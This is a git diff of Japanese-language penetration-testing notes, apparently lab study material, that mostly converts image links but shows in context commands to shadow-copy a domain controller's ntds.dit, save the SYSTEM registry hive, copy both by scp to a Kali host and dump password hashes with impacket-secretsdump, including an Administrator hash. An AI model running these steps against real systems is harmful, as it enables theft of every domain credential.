@@ -21,28 +21,28 @@ vshadow.exe -nw -p  C:
 ```
 - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 ```
-![](../../../assets/images/Pasted%20image%2020260502093840.png)
+![[Pasted image 20260502093840.png]]
 *シャドウ コピー デバイス名をメモしておく*
 
 ## シャドウコピーをCドライブにコピー
 ```cmd
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 ```
-![](../../../assets/images/Pasted%20image%2020260502093835.png)
+![[Pasted image 20260502093835.png]]
 ## WindowsレジストリからSYSTEMハイブを保存する
 ```cmd
 reg.exe save hklm\system c:\system.bak
 ```
-![](../../../assets/images/Pasted%20image%2020260502093822.png)
+![[Pasted image 20260502093822.png]]
 ## 2つの.bakファイルをKaliに送信
 ```cmd
 scp system.bak kali@192.168.45.181:/home/kali/
 
 scp ntds.dit.bak kali@192.168.45.181:/home/kali/
 ```
-![](../../../assets/images/Pasted%20image%2020260502093811.png)
+![[Pasted image 20260502093811.png]]
 
-![](../../../assets/images/Pasted%20image%2020260502093808.png)
+![[Pasted image 20260502093808.png]]
 
 ## パスワードハッシュ解析
 ```zsh
@@ -52,7 +52,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
 ```
-![](../../../assets/images/Pasted%20image%2020260502093802.png)
+![[Pasted image 20260502093802.png]]
 
 ---
 # ドメイン管理者権限がない場合
@@ -124,7 +124,7 @@ Info: Downloading C:\Temp\ntds.dit to ntds.dit
 Info: Download successful!
 
 ```
-![](../../../assets/images/Pasted%20image%2020260502093747.png)
+![[Pasted image 20260502093747.png]]
 ```zsh
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
 ```
